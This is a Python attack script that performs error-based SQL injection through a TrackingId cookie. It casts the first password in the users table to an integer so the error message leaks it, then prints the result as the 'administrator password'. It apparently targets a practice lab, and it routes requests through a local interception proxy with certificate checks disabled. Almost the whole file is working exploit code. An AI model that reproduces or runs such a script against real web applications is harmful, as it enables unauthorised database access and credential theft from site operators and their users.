import requests
import urllib3
import urllib
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def sql_payload(url):
    payload = "'|| CAST((select password from users LIMIT 1) as int) --"
    payload_encoded = urllib.parse.quote(payload)
    cookies = {'TrackingId':''+payload_encoded,'session':'46SwuVX6SNGWvf96LjZ0A80yoZgno03G'}
    r = requests.get(url,cookies=cookies,verify=False,proxies=proxies)
    bs4 = BeautifulSoup(r.text, "html.parser")
    for i in bs4.find_all('h4'):
        h4 = str(i)[50:-5]
        print(h4)

def main():
    if len(sys.argv) != 2:
        print("Usages: %s <url>" %sys.argv[0])
        print("Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("Retriving administrator password....")
    sql_payload(url)

if __name__ == "__main__":
    main()